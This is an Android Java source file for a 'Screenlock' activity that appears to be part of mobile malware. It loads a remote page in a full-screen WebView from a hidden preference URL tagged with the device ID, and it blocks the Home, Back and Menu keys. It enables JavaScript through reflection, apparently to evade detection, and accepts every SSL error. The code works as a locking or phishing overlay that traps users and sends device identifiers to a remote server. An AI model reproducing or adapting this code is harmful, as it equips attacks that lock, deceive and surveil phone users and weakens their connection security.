package com.moonny.acts;

import android.annotation.TargetApi;
import android.app.Activity;
import android.content.Context;
import android.graphics.Color;
import android.net.http.SslError;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.view.ViewGroup;
import android.webkit.SslErrorHandler;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.RelativeLayout;

import com.moonny.helpers.IDUtility;
import com.moonny.Modules;
import com.moonny.constants.Constant;
import com.moonny.constants.S;

import java.lang.reflect.Method;

public class Screenlock extends Activity {

    public static String url;
    protected WebView mWebView;
    String urlScheme = null;

    @TargetApi(Build.VERSION_CODES.HONEYCOMB)
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        url = (String) Modules.main(this, S.get_pref, new Object[]{ S.free_dialog_url, "" }) /* Prefs-Manager.get(this, S.free_dialog_url, "") */;
        if (url.isEmpty())
            return;

        urlScheme = url + S.freeDialogUrl + IDUtility.getID(this);
        
        setContentView(new CustomWebView(this));

//        setFinishOnTouchOutside(false);       //  for un touch

        getWindow().setLayout(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT);

        findViewById(android.R.id.content).setBackgroundColor(Color.rgb(240, 242, 245));

        mWebView = (WebView) findViewById(android.R.id.copyUrl);
        mWebView.setVerticalScrollBarEnabled(true);
//        mWebView.setOnTouchListener(new View.OnTouchListener() {       //  for un touch
//            @Override
//            public boolean onTouch(View v, MotionEvent event) {
//                return (event.getAction() == MotionEvent.ACTION_MOVE);
//            }
//        });

        loadPage(urlScheme);
    }

    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (keyCode == KeyEvent.KEYCODE_HOME || keyCode == KeyEvent.KEYCODE_BACK || keyCode == KeyEvent.KEYCODE_MENU) {
            return true;
        }

        return false;
    }

    @Override
    protected void onPause() {
        super.onPause();
        if(Constant.DEBUG) Log.d("TAG", "onPause finish");
        finish();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        finish();
    }

    private void loadPage(String url) {

        try{
            mWebView.setWebViewClient(new OAuthWebViewClient());
            WebSettings webSettings = mWebView.getSettings();

            try {
                //webSettings.setJavaScriptEnabled(true);
                Method m = webSettings.getClass().getDeclaredMethod("setJavaScriptEnabled", boolean.class);
                m.invoke(webSettings, true);
            }catch (Exception e){
                if(Constant.DEBUG)
                {
                    e.printStackTrace();
                    Log.d("Screenlock", e.getMessage());
                }
            }

            mWebView.loadUrl(url);
            mWebView.setVisibility(View.INVISIBLE);
            
        } catch (Exception e) {
            e.printStackTrace();
            finish();
        }
    }

    private class OAuthWebViewClient extends WebViewClient {
        public boolean canShowPage = true;

        @Override
        public boolean shouldOverrideUrlLoading(WebView view, String url) {
            return false;
        }

        @Override
        public void onPageFinished(WebView view, String url) {
            super.onPageFinished(view, url);
            if (canShowPage)
                view.setVisibility(View.VISIBLE);
        }

        @Override
        public void onReceivedSslError(WebView view, SslErrorHandler handler, SslError error) {
            //super.onReceivedSslError(view, handler, error);
            if(Constant.DEBUG) Log.e("CustomWeb", "SSL ERROR: " + error.toString());
            handler.proceed();
        }

        @Override
        public void onReceivedError(WebView view, int errorCode, String description, String failingUrl) {
            super.onReceivedError(view, errorCode, description, failingUrl);
            canShowPage = false;
        }
    }

    private class CustomWebView extends RelativeLayout {
        public CustomWebView(Context context) {
            super(context);

            WebView webView = new WebView(context);

            ViewGroup.LayoutParams lp = new LayoutParams(LayoutParams.MATCH_PARENT, LayoutParams.MATCH_PARENT);
            webView.setLayoutParams(lp);
            addView(webView);
            webView.setId(android.R.id.copyUrl);
            webView.setVisibility(View.INVISIBLE);
        }
    }

}